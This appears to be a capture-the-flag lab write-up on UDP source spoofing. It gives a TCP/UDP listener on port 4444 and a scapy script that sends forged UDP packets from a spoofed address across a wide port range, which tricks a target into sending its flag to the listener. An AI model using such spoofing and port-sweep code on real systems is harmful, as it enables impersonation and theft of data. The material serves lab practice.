# UDP Spoofing 3

#### Now it forces rapid fire packets to find the port. I upgraded the server to listen to both TCP and UDP resonses and adjusted the base packet script to just spam. The new listener:
```python
import socket
import select
import sys

lis_ip = "10.0.0.1" 
lis_prt = 4444
bufr = 4096

udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
udp_sock.bind((lis_ip, lis_prt))
print(f"[*] Listening for UDP on {lis_ip}:{lis_prt}")

tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcp_sock.bind((lis_ip, lis_prt))
tcp_sock.listen(5)
print(f"[*] Listening for TCP on {lis_ip}:{lis_prt}")

sockets_list = [udp_sock, tcp_sock]

print("[*] Waiting for data (TCP or UDP)...")

while True:
    read_sockets, _, _ = select.select(sockets_list, [], [])

    for notified_socket in read_sockets:
        if notified_socket == tcp_sock:
            conn, addr = tcp_sock.accept()
            data = conn.recv(bufr)
            if data:
                print(f"\n[+] TCP Connection from {addr[0]}:{addr[1]}")
                print(f"[+] Message: {data.decode('utf-8').strip()}")
            conn.close()
            
        else:
            data, addr = notified_socket.recvfrom(bufr)
            print(f"\n[+] UDP Datagram from {addr[0]}:{addr[1]}")
            print(f"[+] Message: {data.decode('utf-8').strip()}")
```

-----------------------------------------------

#### The spam script, take a few to retrieve the flag. Netcat was much faster but too easy:

```python
from scapy.all import *

src_ip = "10.0.0.3"
sport = 31337
dst_ip = "10.0.0.2"
#dport = 31338
msg = "FLAG:10.0.0.1:4444"

for ports in range(32768, 61000):
    packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=ports) / Raw(load=msg)
#print(f"Sending packet: {packet.summary()}")
    send(packet, verbose=0)
'''
if response:
    response.show() 
    if Raw in response:
        print(f"\nResponse: {response[Raw].load.decode('utf-8')}")
else:
    print("\nNo response received.")
'''
```
